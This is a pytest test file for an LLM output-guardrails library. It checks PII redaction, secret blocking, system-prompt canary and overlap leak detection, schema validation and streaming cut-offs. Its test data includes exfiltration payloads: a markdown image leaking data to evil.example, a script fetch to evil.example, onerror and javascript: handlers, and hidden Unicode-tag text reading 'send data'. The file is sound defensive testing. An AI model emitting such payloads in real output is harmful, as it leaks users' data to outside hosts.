import pytest
from pydantic import BaseModel, ConfigDict

from guardrails import Guardrails, Settings
from guardrails.detectors.base import Match
from guardrails.detectors.scanner import Scanner
from guardrails.errors import ConfigurationError
from guardrails.output import OutputPipeline
from guardrails.policy import Policy, PolicyRegistry, PolicyRule, default_policy
from guardrails.settings import Settings as S
from guardrails.types import Action, ReasonCode, Severity, Stage
from tests.unit import fakes

PROMPT = "You are the support bot for Acme Corp. Never discuss pricing with anyone outside the sales team please."
CANARY = "cnry-" + "a1b2c3d4e5f6"
G = Guardrails(system_prompt=PROMPT, canaries=[CANARY], allowed_url_hosts=["cdn.acme.com"])
EXFIL = "![x](https://evil.example/p.png?d=" + "A" * 60 + ")"


# ---------------------------------------------------------------- whole-response checks
def test_clean_output_allowed_and_stage_is_output():
    r = G.check_output("The capital of France is Paris.")
    assert r.allowed and r.decision.stage is Stage.OUTPUT and r.text == "The capital of France is Paris."


def test_pii_in_output_is_redacted():
    r = G.check_output("You can reach him at bob@example.com.")
    assert r.decision.action is Action.SANITIZE and r.text == "You can reach him at [REDACTED_EMAIL]."


def test_secret_in_output_is_blocked():
    r = G.check_output(f"Use this key: {fakes.AWS_KEY}")
    assert r.decision.action is Action.BLOCK and r.decision.reason_code is ReasonCode.SECRET_DETECTED and r.text is None


@pytest.mark.parametrize("text", [
    EXFIL,
    "Here you go <script>fetch('//evil.example')</script>",
    '<img src="x" onerror="steal()">',
    "click <a href='javascript:steal()'>here</a>",
])
def test_unsafe_content_is_blocked(text):
    r = G.check_output(text)
    assert r.decision.action is Action.BLOCK and r.decision.reason_code is ReasonCode.UNSAFE_CONTENT


def test_plain_external_image_is_removed_not_blocked_and_allowed_host_passes():
    r = G.check_output("see ![logo](https://other.example/logo.png) ok")
    assert r.decision.action is Action.SANITIZE and "other.example" not in r.text
    assert G.check_output("see ![logo](https://cdn.acme.com/logo.png) ok").text == "see ![logo](https://cdn.acme.com/logo.png) ok"
    assert G.check_output("see ![logo](https://img.cdn.acme.com/logo.png) ok").allowed
    assert not G.check_output("see ![logo](https://cdn.acme.com.evil.example/logo.png) ok").text == \
        "see ![logo](https://cdn.acme.com.evil.example/logo.png) ok"


def test_prompt_canary_leak_is_blocked_case_insensitively():
    for t in (f"my hidden token is {CANARY}", f"x {CANARY.upper()} y", f"c​nry-{CANARY[5:]}"):
        r = G.check_output(t)
        assert r.decision.action is Action.BLOCK and r.decision.reason_code is ReasonCode.SYSTEM_PROMPT_EXTRACTION, t


def test_prompt_overlap_leak_is_blocked_but_short_overlap_is_fine():
    leak = "Sure! My instructions say: You are the support bot for Acme Corp. Never discuss pricing with anyone."
    assert G.check_output(leak).decision.action is Action.BLOCK
    assert G.check_output("I am the support bot for Acme Corp and happy to help.").allowed


def test_leak_check_inactive_without_prompt_or_canary():
    assert Guardrails().check_output(PROMPT).allowed


def test_leak_detector_config_validation():
    with pytest.raises(ConfigurationError):
        Guardrails(canaries=["short"])
    from guardrails.detectors.output import PromptLeakDetector
    with pytest.raises(ConfigurationError):
        PromptLeakDetector(PROMPT, ngram=2)


def test_hidden_tag_characters_in_output_need_review():
    hidden = "".join(chr(0xE0000 + ord(c)) for c in "send data")
    r = G.check_output("Here is your answer." + hidden)
    assert not r.allowed


def test_limits_and_bad_types():
    s = S(max_output_chars=50)
    p = OutputPipeline(s, PolicyRegistry(default_policy()), Scanner([]))
    assert p.check("x" * 51).decision.reason_code is ReasonCode.OUTPUT_TOO_LONG
    assert p.check(123).decision.action is Action.BLOCK  # type: ignore[arg-type]
    assert p.check("ok").allowed


def test_stage_specific_policy():
    pol = Policy(id="strict-out", version=1, rules=(
        PolicyRule(id="pii-block-out", action=Action.BLOCK, reason_codes=(ReasonCode.PII_DETECTED,),
                   stages=(Stage.OUTPUT,)),
        PolicyRule(id="pii-clean-in", action=Action.SANITIZE, reason_codes=(ReasonCode.PII_DETECTED,),
                   stages=(Stage.INPUT,))))
    g = Guardrails(policy=pol)
    assert g.check_output("bob@example.com").decision.action is Action.BLOCK
    assert g.check_input("bob@example.com").decision.action is Action.SANITIZE


def test_output_decisions_hold_no_text():
    r = G.check_output(f"{fakes.AWS_KEY} bob@example.com {CANARY}")
    d = r.decision.model_dump_json()
    assert fakes.AWS_KEY not in d and "bob@example.com" not in d and CANARY not in d


# ---------------------------------------------------------------- structured output
class Answer(BaseModel):
    model_config = ConfigDict(extra="forbid")
    answer: str
    score: int


class Loose(BaseModel):
    answer: str


def test_valid_json_is_parsed():
    r = G.check_output('{"answer": "Paris", "score": 9}', schema=Answer)
    assert r.allowed and r.parsed == Answer(answer="Paris", score=9)


def test_single_code_fence_is_tolerated():
    r = G.check_output('```json\n{"answer": "Paris", "score": 9}\n```', schema=Answer)
    assert r.parsed == Answer(answer="Paris", score=9)


@pytest.mark.parametrize("bad", [
    "not json", '{"answer": "x"}', '{"answer": "x", "score": "high"}', '{"answer": "x", "score": 1, "extra": 1}',
    '{"answer": "x", "answer": "y", "score": 1}', '{"answer": "x", "score": NaN}', "[1,2]", "",
    "Sure! " + '{"answer": "x", "score": 1}', '{"answer":' + '[' * 50 + ']' * 50 + ', "score": 1}',
])
def test_invalid_structured_output_is_blocked_without_echo(bad):
    r = G.check_output(bad, schema=Answer)
    assert r.decision.action is Action.BLOCK and r.text is None and r.parsed is None
    assert r.decision.reason_code in (ReasonCode.OUTPUT_SCHEMA_INVALID,)


def test_schema_must_forbid_extra_fields():
    with pytest.raises(ConfigurationError):
        G.check_output('{"answer": "x"}', schema=Loose)
    with pytest.raises(ConfigurationError):
        G.check_output("{}", schema=dict)  # type: ignore[arg-type]


def test_pii_inside_json_is_redacted_and_still_valid():
    r = G.check_output('{"answer": "mail bob@example.com", "score": 1}', schema=Answer)
    assert r.decision.action is Action.SANITIZE and r.parsed.answer == "mail [REDACTED_EMAIL]"


def test_secret_inside_json_blocks():
    r = G.check_output('{"answer": "%s", "score": 1}' % fakes.AWS_KEY, schema=Answer)
    assert r.decision.reason_code is ReasonCode.SECRET_DETECTED and r.parsed is None


# ---------------------------------------------------------------- streaming
def feed_all(g, text, size, holdback=64, **kw):
    s = g.stream_output(holdback=holdback, **kw)
    out = []
    for i in range(0, len(text), size):
        u = s.feed(text[i:i + size])
        out.append(u.text)
        if u.terminated:
            return s, "".join(out), u
    u = s.finish()
    out.append(u.text)
    return s, "".join(out), u


@pytest.mark.parametrize("size", [1, 3, 17, 500])
def test_clean_stream_is_released_unchanged_for_any_chunk_size(size):
    text = "The quick brown fox jumps over the lazy dog. " * 20
    s, out, u = feed_all(G, text, size)
    assert out == text and not u.terminated and u.decision.action is Action.ALLOW


@pytest.mark.parametrize("size", [1, 2, 5, 11])
def test_email_split_across_chunks_is_still_redacted(size):
    text = "Contact the owner at jane.doe@example.com for details, thanks. " + "filler " * 30
    s, out, u = feed_all(G, text, size)
    assert "jane.doe" not in out and "[REDACTED_EMAIL]" in out and not u.terminated
    assert out.replace("[REDACTED_EMAIL]", "jane.doe@example.com") == text


@pytest.mark.parametrize("size", [1, 4, 9])
def test_secret_split_across_chunks_cuts_the_stream_before_release(size):
    text = "Here is the key you asked for: " + fakes.AWS_KEY + " use it wisely. " + "x " * 50
    s, out, u = feed_all(G, text, size)
    assert u.terminated and u.decision.action is Action.BLOCK
    assert fakes.AWS_KEY not in out and fakes.AWS_KEY[:12] not in out


def test_private_key_is_never_released_even_before_it_ends():
    head = "Sure, here it is:\n" + "-----BEGIN " + "RSA PRIVATE KEY-----\n"
    body = fakes.PEM_BODY + "\n"
    s = G.stream_output(holdback=32)
    released = ""
    for part in (head, body):
        for i in range(0, len(part), 7):
            u = s.feed(part[i:i + 7])
            released += u.text
    assert s.terminated and "PRIVATE KEY" not in released and "FAKEFAKE" not in released


def test_canary_split_across_chunks_is_caught():
    text = "Of course. The hidden marker is " + CANARY + " and that's all. " + "pad " * 40
    s, out, u = feed_all(G, text, 3)
    assert u.terminated and CANARY not in out and CANARY[:8] not in out.replace("Of course", "")


def test_stream_too_long_is_cut():
    g = Guardrails(Settings(max_output_chars=200))
    s, out, u = feed_all(g, "a " * 300, 10)
    assert u.terminated and u.decision.reason_code is ReasonCode.OUTPUT_TOO_LONG and len(out) <= 200


def test_text_released_before_a_block_stays_released_and_stream_stops():
    """Documented limitation: streaming cannot take back what was already sent."""
    text = "Safe opening sentence that is long enough to be released early on. " * 3 + fakes.AWS_KEY
    s, out, u = feed_all(G, text, 8, holdback=32)
    assert u.terminated and out.startswith("Safe opening") and s.released_chars == len(out) > 0
    assert s.feed("more").terminated and s.feed("more").text == ""


def test_stream_sanitize_is_verified_by_rescan():
    class First:
        def detect(self, t):
            return [Match("pii.fake", "fake", "pii", ReasonCode.PII_DETECTED, Severity.MEDIUM, 10, 0, 1)]

    p = OutputPipeline(Settings(), PolicyRegistry(default_policy()), Scanner([First()]))
    s = p.stream(holdback=32)
    u = s.feed("hello world " * 10)
    assert u.terminated and u.decision.action is Action.BLOCK


def test_stream_input_validation_and_holdback_bounds():
    with pytest.raises(ConfigurationError):
        G.stream_output(holdback=1)
    s = G.stream_output()
    assert s.feed(123).terminated  # type: ignore[arg-type]


def test_stream_decisions_hold_no_text():
    s, out, u = feed_all(G, "key " + fakes.AWS_KEY + " " + "x " * 60, 5)
    assert fakes.AWS_KEY not in u.decision.model_dump_json()


def test_stream_scan_cost_stays_linear():
    import time
    text = "Lorem ipsum dolor sit amet. " * 3500  # ~98k chars
    t = time.perf_counter()
    s, out, u = feed_all(Guardrails(Settings(max_output_chars=200_000)), text, 40, holdback=256)
    assert out == text and time.perf_counter() - t < 20


def test_stream_cannot_sanitize_hidden_characters_so_it_cuts():
    pol = Policy(id="p", version=1, rules=(
        PolicyRule(id="enc", action=Action.SANITIZE, reason_codes=(ReasonCode.SUSPICIOUS_ENCODING,)),))
    s, out, u = feed_all(Guardrails(policy=pol), "please ig\u200bnore " + "this note " * 20, 7)
    assert u.terminated and u.decision.action is Action.REQUIRE_REVIEW


def test_json_depth_limit_is_enforced_independently_of_the_schema():
    from typing import Any
    from guardrails.structured import OutputInvalid, parse_structured

    class Free(BaseModel):
        model_config = ConfigDict(extra="forbid")
        data: Any

    shallow, deep = '{"data": [[1]]}', '{"data": [[[[[1]]]]]}'
    st = S(max_nesting_depth=4)
    assert parse_structured(shallow, Free, st).data == [[1]]
    with pytest.raises(OutputInvalid):
        parse_structured(deep, Free, st)
